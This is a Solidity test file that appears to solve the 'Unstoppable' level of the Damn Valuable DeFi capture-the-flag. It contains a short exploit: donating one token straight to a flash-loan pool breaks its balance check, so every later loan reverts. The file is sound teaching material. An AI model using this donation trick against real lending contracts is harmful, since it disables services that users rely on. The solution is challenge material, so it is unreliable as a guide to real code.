// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "../unstoppable/UnstoppableLender.sol";
import "../unstoppable/ReceiverUnstoppable.sol";
import "../DamnValuableToken.sol";

interface Vm {
    function deal(address who, uint256 amount) external;
    function expectRevert(bytes calldata) external;
}

contract UnstoppableTest is DSTest {
    UnstoppableLender unstoppableLender;
    DamnValuableToken damnValuableToken;
    ReceiverUnstoppable receiverUnstoppable;

    Vm vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        damnValuableToken = new DamnValuableToken();
        unstoppableLender = new UnstoppableLender(address(damnValuableToken));
        receiverUnstoppable = new ReceiverUnstoppable(address(unstoppableLender));
        
        damnValuableToken.approve(address(unstoppableLender), 1000000);
        unstoppableLender.depositTokens(1000000);
        
        damnValuableToken.transfer(address(this), 100);
    }

    function testUnstoppable() public {
        damnValuableToken.transfer(address(unstoppableLender), 1);
        vm.expectRevert("Pool balance should equal token balance");
        receiverUnstoppable.executeFlashLoan(10);
    }
}
